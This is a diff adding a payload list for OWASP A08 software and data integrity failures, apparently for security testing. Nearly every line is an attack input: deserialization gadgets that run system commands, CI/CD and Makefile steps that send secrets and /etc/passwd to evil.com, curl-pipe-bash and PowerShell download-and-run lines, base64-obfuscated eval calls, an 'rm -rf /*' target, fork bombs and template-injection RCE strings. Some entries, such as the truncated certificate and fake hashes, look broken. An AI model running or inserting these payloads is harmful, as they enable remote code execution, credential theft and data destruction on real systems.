@@ -1,0 +1,328 @@
+# OWASP A08:2021 - Software and Data Integrity Failures Payloads
+# Complete collection of integrity attack vectors
+
+# Deserialization Attacks - Java
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4
+aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017400016174000162780
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl9pbmRlbnROdW1iZXIySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4ABUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////8AAAAA/3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAXOyv66vgAAADIAOAEACWJhc2VDbGFzcwcAAQEAFGJhc2VDbGFzcy5jbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBAABWAQAEY29kZQEAA1sCAAABAApTb3VyY2VGaWxlAQAOYmFzZUNsYXNzLmphdmHKAAAAjLEAAAJLAQAZIQAAAAACAAAACAAAAAEAAAAFAQAAAAGBAABxBwAAFJMAAAAAB9EAEAAEjQBPAAAACJF8AgCFfDIBhXwgAoXBHwAXhXw3AECUfA
+
+# Deserialization Attacks - PHP
+O:8:"stdClass":1:{s:4:"name";s:5:"admin";}
+O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
+O:10:"PDOHandler":1:{s:3:"pdo";O:3:"PDO":0:{}}
+a:2:{i:0;s:4:"eval";i:1;s:22:"system('whoami');";}
+O:11:"PharContext":1:{s:4:"code";s:11:"phpinfo();";}
+O:12:"SplFileInfo":1:{s:8:"filename";s:11:"/etc/passwd";}
+
+# Deserialization Attacks - .NET
+AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIFSXRlbXMHVmVyc2lvbgADAAYIjAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAkEAAAABAQAAAAJBQAAAA8DAAAAAgAAAAYGAAAAL2NhbGMuZXhlBgcAAAAQL3c6L2V4cC5leGUEBAAAAAsA
+/wAAAP//AAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIFSXRlbXMHVmVyc2lvbgADAAYIjAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAkEAAAABAQAAAAJBQAAAA8DAAAAAgAAAAYGAAAADGNhbGMuZXhlBgcAAAAML2V4cC5leGUEBAAAADEAAwAAD0A=
+
+# Deserialization Attacks - Python (pickle)
+cos
+system
+(S'whoami'
+tR.
+c__builtin__
+eval
+(S'__import__("os").system("whoami")'
+tR.
+csubprocess
+call
+(S'calc.exe'
+tR.
+c__builtin__
+eval
+(S'print("RCE")'
+tR.
+cbuiltins
+exec
+(S'import os; os.system("whoami")'
+tR.
+
+# Deserialization Attacks - Ruby (Marshal)
+\x04\x08o:\x0BObject\x00
+\x04\x08[\x06I\"\x05ls\x06:\x06ET
+\x04\x08U:\x0FKernel\x06[\x06I\"\x10system('ls')\x06:\x06ET
+\x04\x08o:\x1CActiveSupport::Deprecation\x07:\x0E@silenced[\x06:\x0Fputs('pwned')
+
+# CI/CD Pipeline Attacks
+stages:
+  - pwned
+job:
+  script:
+    - curl http://evil.com/$(whoami)
+    - wget http://attacker.com/payload.sh
+    - bash payload.sh
+    - echo $SECRET_VARS | base64 | curl -X POST -d @- http://evil.com/
+    - cat /etc/passwd | base64 | curl -X POST -d @- http://evil.com/
+
+# Supply Chain Attacks
+name: malicious-package
+version: 1.0.0
+dependencies:
+  evil-dependency: ">=1.0.0"
+scripts:
+  postinstall: "curl http://evil.com/pwned"
+  preuninstall: "curl http://evil.com/removing"
+
+# Package Dependency Confusion
+@internal/package-name
+@company/internal-lib
+company-internal-utils
+internal-api-client
+private-components
+secret-config-loader
+admin-dashboard-lib
+enterprise-auth-module
+sensitive-data-handler
+proprietary-algorithm
+confidential-service
+restricted-access-lib
+
+# Code Injection via Updates
+eval(request.body.code)
+exec(request.body.command)
+system(request.body.cmd)
+require(request.body.module)
+import(request.body.library)
+loadModule(request.body.moduleName)
+executeScript(request.body.script)
+runCommand(request.body.command)
+processCode(request.body.payload)
+dynamicRequire(request.body.path)
+
+# Container Image Attacks
+FROM malicious-base:latest
+RUN curl http://evil.com/backdoor.sh | sh
+RUN wget -O - http://attacker.com/payload | bash
+COPY malicious-binary /usr/local/bin/
+ADD http://evil.com/trojan.tar.gz /opt/
+USER root
+ENTRYPOINT ["backdoor"]
+CMD ["reverse-shell"]
+
+# NPM Package Attacks
+require('child_process').exec('curl http://evil.com/$(whoami)')
+eval(Buffer.from('Y3VybCBodHRwOi8vZXZpbC5jb20v', 'base64').toString())
+process.binding('spawn_sync').spawn({file: '/bin/sh', args: ['-c', 'curl http://evil.com/pwned']})
+require('fs').readFileSync('/etc/passwd', 'utf8')
+new Function('return this')().process.mainModule.require('child_process').execSync('whoami')
+
+# PyPI Package Attacks
+import os; os.system('curl http://evil.com/$(whoami)')
+__import__('subprocess').call(['curl', 'http://evil.com/pwned'])
+exec(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpCg=='))
+eval(compile(__import__('base64').b64decode('cHJpbnQoInB3bmVkIik='), '<string>', 'exec'))
+
+# RubyGems Attacks
+system('curl http://evil.com/$(whoami)')
+`curl http://evil.com/pwned`
+exec('curl http://evil.com/$(whoami)')
+eval(Base64.decode64('c3lzdGVtKCdjdXJsIGh0dHA6Ly9ldmlsLmNvbS8nKQ=='))
+Kernel.system('curl http://evil.com/pwned')
+
+# Maven/Gradle Attacks
+<groupId>evil.com</groupId>
+<artifactId>malicious-lib</artifactId>
+<version>1.0.0</version>
+implementation 'evil.com:backdoor:1.0.0'
+compile 'attacker.com:trojan:latest'
+
+# NuGet Package Attacks
+<PackageReference Include="MaliciousPackage" Version="1.0.0" />
+Install-Package EvilLibrary -Version 1.0.0
+dotnet add package BackdoorUtil
+
+# Docker Registry Attacks
+docker pull evil.com/backdoored-image:latest
+docker run --privileged evil.com/malicious:latest
+docker exec -it container_id curl http://evil.com/pwned
+
+# Git Submodule Attacks
+[submodule "malicious"]
+  path = lib/malicious
+  url = https://evil.com/backdoor.git
+git submodule add https://evil.com/trojan.git vendor/trojan
+git submodule update --init --recursive
+
+# Software Update Attacks
+curl -s http://evil.com/update.sh | bash
+wget -O - http://attacker.com/patch | sudo sh
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/update.ps1')"
+python -c "import urllib;exec(urllib.urlopen('http://evil.com/update.py').read())"
+
+# Binary Signature Bypass
+signtool sign /f fake-cert.pfx /p password malicious.exe
+codesign -s "Fake Developer" --force malicious.app
+osslsigncode sign -certs fake.crt -key fake.key -in malicious.exe -out signed.exe
+jarsigner -keystore fake.jks -storepass password malicious.jar fake-cert
+
+# Checksum/Hash Manipulation
+MD5: d41d8cd98f00b204e9800998ecf8427e
+SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709
+SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+SHA512: cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e
+
+# CDN Attacks
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://unpkg.com/react@17/umd/react.production.min.js"></script>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+# Package Lock Manipulation
+{
+  "name": "evil-package",
+  "version": "1.0.0",
+  "resolved": "https://evil.com/evil-package-1.0.0.tgz",
+  "integrity": "sha1-fake-hash-here",
+  "requires": {
+    "malicious-dep": "^1.0.0"
+  }
+}
+
+# Environment Variable Injection
+NODE_ENV=production; curl http://evil.com/$(whoami)
+PATH=/evil/bin:$PATH
+LD_LIBRARY_PATH=/malicious/lib:$LD_LIBRARY_PATH
+PYTHONPATH=/backdoor/modules:$PYTHONPATH
+CLASSPATH=/trojan/classes:$CLASSPATH
+
+# Configuration File Attacks
+[core]
+  editor = curl http://evil.com/pwned; vim
+[alias]
+  st = !curl http://evil.com/$(whoami)
+[url "https://evil.com/"]
+  insteadOf = https://github.com/
+
+# Makefile Attacks
+all:
+	@curl http://evil.com/$(shell whoami)
+	@wget -O - http://attacker.com/payload | bash
+install:
+	curl http://evil.com/install | sh
+clean:
+	rm -rf /* 2>/dev/null || true
+
+# Firmware Update Attacks
+firmware_version=1.0.0-backdoored
+update_url=http://evil.com/firmware.bin
+checksum=fake-checksum-here
+signature=invalid-signature
+
+# Digital Certificate Attacks
+-----BEGIN CERTIFICATE-----
+MIIBkTCB+wIJAKHHH4MHKJcJMA0GCSqGSIb3DQEBBQUAMBExDzANBgNVBAMMBkV2
+aWwgQ0EwHhcNMjEwNjAxMDAwMDAwWhcNMjIwNjAxMDAwMDAwWjARMQ8wDQYDVQQD
+DAZFdmlsIENBMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFakeHash123...
+-----END CERTIFICATE-----
+
+# Code Signing Attacks
+SignTool sign /f malicious.pfx /p password /t http://timestamp.evil.com evil.exe
+codesign --force --sign "Developer ID Application: Evil Corp" malicious.app
+jarsigner -keystore evil.jks -storepass password malicious.jar evil-cert
+
+# Registry/Repository Attacks
+registry.npmjs.org/evil-package/-/evil-package-1.0.0.tgz
+registry.hub.docker.com/evilcorp/backdoored-image:latest
+rubygems.org/gems/malicious-gem-1.0.0.gem
+pypi.org/simple/evil-package/evil-package-1.0.0.tar.gz
+
+# Version Confusion Attacks
+package-name@1.0.0-alpha.0
+package-name@0.0.1-dev.1
+package-name@999.999.999
+package-name@1.0.0+build.evil
+package-name@1.0.0-rc.1.evil
+
+# Dependency Confusion
+internal-api-client
+company-utils
+private-components
+secret-config
+admin-tools
+enterprise-auth
+sensitive-data-lib
+proprietary-crypto
+confidential-logger
+restricted-access
+
+# Build Script Injection
+#!/bin/bash
+curl http://evil.com/build-started
+make clean
+make all
+curl http://evil.com/build-complete/$(whoami)
+
+# Archive Bomb
+zip bomb.zip evil.txt
+tar -czf bomb.tar.gz evil.txt
+7z a -t7z bomb.7z evil.txt -mx9
+rar a bomb.rar evil.txt
+
+# Resource Exhaustion
+while true; do fork(); done
+malloc(SIZE_MAX)
+for(;;) new Array(999999999)
+System.gc(); while(true) new byte[Integer.MAX_VALUE]
+
+# Zip Slip
+../../../evil.txt
+..\..\..\..\evil.txt
+../../../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+
+# DLL Hijacking
+kernel32.dll
+user32.dll
+advapi32.dll
+shell32.dll
+ole32.dll
+oleaut32.dll
+version.dll
+wininet.dll
+comctl32.dll
+msvcrt.dll
+
+# Shared Library Attacks
+LD_PRELOAD=/evil/lib.so
+DYLD_INSERT_LIBRARIES=/evil/lib.dylib
+PATH=/evil/bin:$PATH
+LD_LIBRARY_PATH=/evil/lib:$LD_LIBRARY_PATH
+
+# Plugin/Extension Attacks
+manifest.json:
+{
+  "name": "Evil Extension",
+  "permissions": ["<all_urls>", "storage", "tabs"],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["evil.js"]
+    }
+  ]
+}
+
+# Configuration Injection
+{"config": {"eval": "require('child_process').exec('curl http://evil.com/pwned')"}}
+config.eval=system('curl http://evil.com/$(whoami)')
+settings[debug]=true&settings[eval]=true
+
+# Template Injection
+${7*7}
+{{7*7}}
+<%=7*7%>
+#{7*7}
+${{7*7}}
+{%set x=7*7%}{{x}}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
+
+# Prototype Pollution
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+?__proto__[admin]=true
+?constructor[prototype][admin]=true
+Object.prototype.admin = true;
